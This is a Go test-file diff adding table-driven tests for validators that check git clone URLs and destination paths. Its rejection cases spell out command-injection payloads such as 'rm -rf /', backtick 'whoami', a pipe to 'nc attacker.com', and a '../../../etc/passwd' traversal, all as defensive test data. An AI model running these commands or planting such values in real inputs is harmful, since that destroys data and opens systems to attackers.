@@ -80,3 +80,160 @@ func TestFeature_String(t *testing.T) {
 		})
 	}
 }
+
+func TestValidateCloneURL(t *testing.T) {
+	tests := []struct {
+		name      string
+		cloneURL  string
+		wantError bool
+	}{
+		{
+			name:      "Valid HTTPS GitHub URL",
+			cloneURL:  "https://github.com/user/repo.git",
+			wantError: false,
+		},
+		{
+			name:      "Valid HTTPS Azure DevOps URL",
+			cloneURL:  "https://dev.azure.com/org/project/_git/repo",
+			wantError: false,
+		},
+		{
+			name:      "Valid SSH URL",
+			cloneURL:  "ssh://git@github.com/user/repo.git",
+			wantError: false,
+		},
+		{
+			name:      "Valid git protocol URL",
+			cloneURL:  "git://github.com/user/repo.git",
+			wantError: false,
+		},
+		{
+			name:      "Empty URL",
+			cloneURL:  "",
+			wantError: true,
+		},
+		{
+			name:      "Invalid scheme - ftp",
+			cloneURL:  "ftp://example.com/repo.git",
+			wantError: true,
+		},
+		{
+			name:      "URL with newline (injection attempt)",
+			cloneURL:  "https://github.com/user/repo.git\nrm -rf /",
+			wantError: true,
+		},
+		{
+			name:      "URL with semicolon (injection attempt)",
+			cloneURL:  "https://github.com/user/repo.git;rm -rf /",
+			wantError: true,
+		},
+		{
+			name:      "URL with backtick (injection attempt)",
+			cloneURL:  "https://github.com/user/`whoami`.git",
+			wantError: true,
+		},
+		{
+			name:      "URL with pipe (injection attempt)",
+			cloneURL:  "https://github.com/user/repo.git|nc attacker.com",
+			wantError: true,
+		},
+		{
+			name:      "URL without host",
+			cloneURL:  "https:///repo.git",
+			wantError: true,
+		},
+		{
+			name:      "Malformed URL",
+			cloneURL:  "not a valid url",
+			wantError: true,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			err := ValidateCloneURL(tt.cloneURL)
+			if tt.wantError && err == nil {
+				t.Error("Expected error but got none")
+			}
+			if !tt.wantError && err != nil {
+				t.Errorf("Expected no error but got: %v", err)
+			}
+		})
+	}
+}
+
+func TestValidateDestPath(t *testing.T) {
+	tests := []struct {
+		name      string
+		destPath  string
+		wantError bool
+	}{
+		{
+			name:      "Valid relative path",
+			destPath:  "repos/myrepo",
+			wantError: false,
+		},
+		{
+			name:      "Valid absolute path",
+			destPath:  "/tmp/repos/myrepo",
+			wantError: false,
+		},
+		{
+			name:      "Valid path with dots in name",
+			destPath:  "repos/my.repo",
+			wantError: false,
+		},
+		{
+			name:      "Empty path",
+			destPath:  "",
+			wantError: true,
+		},
+		{
+			name:      "Path with newline (injection attempt)",
+			destPath:  "repos/myrepo\nrm -rf /",
+			wantError: true,
+		},
+		{
+			name:      "Path with semicolon (injection attempt)",
+			destPath:  "repos/myrepo;rm -rf /",
+			wantError: true,
+		},
+		{
+			name:      "Path with backtick (injection attempt)",
+			destPath:  "repos/`whoami`",
+			wantError: true,
+		},
+		{
+			name:      "Path with pipe (injection attempt)",
+			destPath:  "repos/myrepo|nc attacker.com",
+			wantError: true,
+		},
+		{
+			name:      "Path with null byte",
+			destPath:  "repos/myrepo\x00",
+			wantError: true,
+		},
+		{
+			name:      "Path starting with .. (traversal attempt)",
+			destPath:  "../../../etc/passwd",
+			wantError: true,
+		},
+		{
+			name:      "Path with $ (variable expansion attempt)",
+			destPath:  "repos/$HOME",
+			wantError: true,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			err := ValidateDestPath(tt.destPath)
+			if tt.wantError && err == nil {
+				t.Error("Expected error but got none")
+			}
+			if !tt.wantError && err != nil {
+				t.Errorf("Expected no error but got: %v", err)
+			}
+		})
+	}
+}
